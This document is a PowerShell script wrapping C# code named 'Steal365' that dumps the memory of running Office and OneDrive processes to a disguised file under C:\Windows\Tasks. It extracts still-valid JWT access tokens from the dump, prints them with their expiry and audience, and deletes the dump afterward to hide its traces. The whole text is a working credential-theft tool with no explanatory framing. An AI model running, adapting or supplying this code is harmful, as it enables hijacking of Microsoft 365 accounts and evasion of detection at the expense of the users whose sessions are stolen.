$code = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Steal365
{
    public class Program
    {
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        static bool MiniDump(string name)
        {
            try
            {
                Process proc = Process.GetProcessesByName(name)[0];
                uint targetProcessId = (uint)proc.Id;
                IntPtr targetProcessHandle = proc.Handle;

                string dumpFile = @"C:\Windows\Tasks\microsoft.log";

                using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
                {
                    if (!MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
                    {
                        return false;
                    }
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        static List<string> GetTokens()
        {
            try
            {
                string file = File.ReadAllText(@"C:\Windows\Tasks\microsoft.log");
                var tokens = new List<string>();
                string pattern = @"\beyJ0eX[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b";
                foreach (Match match in Regex.Matches(file, pattern))
                {
                    tokens.Add(match.ToString());
                }
                List<string> unique = new HashSet<string>(tokens).ToList();
                return unique;
            }
            catch
            {
                return new List<string>();
            }
            finally
            {
                if (File.Exists(@"C:\Windows\Tasks\microsoft.log"))
                    File.Delete(@"C:\Windows\Tasks\microsoft.log");
            }
        }

        static void CheckToken(List<string> tokens)
        {
            foreach (var token in tokens)
            {
                var payload = token.Split('.')[1];

                while ((payload.Length % 4) != 0)
                {
                    payload += "=";
                }

                var json = Encoding.UTF8.GetString(Convert.FromBase64String(payload));

                var match = Regex.Match(json, @"""exp"":\s*(\d+)");
                long exp = long.Parse(match.Groups[1].Value);

                if (exp > DateTimeOffset.Now.ToUnixTimeSeconds())
                {
                    DateTimeOffset dateTimeOffset = DateTimeOffset.FromUnixTimeSeconds(exp);
                    DateTime dateTime = dateTimeOffset.LocalDateTime;

                    Console.WriteLine("    + Valid token: " + dateTime);

                    match = Regex.Match(json, @"""aud"":\s*""([^""]+)""");
                    Console.WriteLine("    + aud: " + match.Groups[1].Value);

                    Console.WriteLine("    + Token: " + token + "\n");
                }
            }
        }

        public static void Main()
        {
            var procs = new List<string> { "WINWORD", "ONENOTEM", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive" };

            foreach (string p in procs)
            {
                if (!MiniDump(p))
                {
                    Console.WriteLine("[!] " + p);
                }
                else
                {
                    Console.WriteLine("[+] Dump " + p + " ok");
                    Console.WriteLine("  \\-- Looking for tokens...");

                    var tokens = GetTokens();

                    if (tokens.Any())
                    {
                        CheckToken(tokens);
                    }
                    else
                    {
                        Console.WriteLine("    - No tokens");
                    }
                }
            }
        }
    }
}
"@

Add-Type -TypeDefinition $code -Language CSharp
[Steal365.Program]::Main()
